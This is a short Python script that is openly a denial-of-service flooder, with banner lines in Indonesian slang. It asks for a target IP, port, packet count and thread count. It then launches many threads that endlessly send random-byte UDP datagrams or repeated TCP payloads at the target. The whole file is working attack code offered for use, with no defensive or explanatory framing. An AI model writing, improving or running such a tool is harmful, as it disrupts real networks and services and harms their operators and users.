import random

import socket

import threading

import os



os.system("clear")

print("Tools By Jihoon.#1501")

print("My Team REX RIOT COMMUNITY")

print("Jangan Abuse Ngab")

ip = str(input("Ip  >>>:"))

port = int(input("Port  >>>:"))

choice = str(input("Gas Gak? (y/n) >>>:"))

times = int(input("Packets  >>>:"))

threads = int(input("Threads  >>>:"))

def run():

    data = random._urandom(1159)

    i = random.choice(("[𝒙]","[𝒙]","[𝒙]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            addr = (str(ip),int(port))

            for x in range(times):

                s.sendto(data,addr)

            print(i +"Jihoon Attack!!!")

        except:

            print("[!] Waduh Down !!!")



def run2():

    data = random._urandom(16)

    i = random.choice(("[𝒙]","[𝒙]","[𝒙]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(i +" Jihiin nih bos!!!")

        except:

            s.close()

            print("[*] Waduh Down !!!")



for y in range(threads):

    if choice == 'y':

        th = threading.Thread(target = run)

        th.start()

    else:

        th = threading.Thread(target = run2)

        th.start()